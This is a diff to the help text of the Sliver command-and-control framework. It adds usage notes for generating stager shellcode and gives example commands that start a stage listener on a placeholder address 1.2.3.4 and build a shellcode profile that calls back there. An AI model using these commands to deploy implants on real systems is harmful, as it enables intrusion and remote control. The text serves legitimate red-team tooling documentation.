@@ -40,6 +40,7 @@ var (
 		consts.NewProfileStr:      newProfileHelp,
 		consts.ProfileGenerateStr: generateProfileHelp,
 		consts.StagerStr:          generateStagerHelp,
+		consts.StageListenerStr:   stageListenerHelp,
 
 		consts.MsfStr:              msfHelp,
 		consts.MsfInjectStr:        msfInjectHelp,
@@ -136,14 +137,33 @@ see 'help new-profile'. All "generate" flags can be saved into a profile, you ca
 command.
 `
 	generateStagerHelp = `[[.Bold]]Command:[[.Normal]] generate stager <options>
-[[.Bold]]About:[[.Normal]] Generate a new sliver  stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --output-format.
+[[.Bold]]About:[[.Normal]] Generate a new sliver stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --format.
+
+[[.Bold]][[.Underline]]++ Bad Characters ++[[.Normal]]
+Bad characters must be specified like this for single bytes:
+
+generate stager -b 00
+
+And like this for multiple bytes:
+
+generate stager -b '00 0a cc'
 
 [[.Bold]][[.Underline]]++ Output Formats ++[[.Normal]]
 You can use the --output-format flag to print out the shellcode to stdout, in one of the following transform formats:
-[[.Italic]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
+[[.Bold]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
 `
 	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
 [[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
+[[.Bold]]Examples:[[.Normal]] 
+
+The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-sliver-profile[[.Normal]] profile to it.
+When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.
+
+stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
+
+To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
+
+new-profile --name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
 `
 
 	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--name] <options>
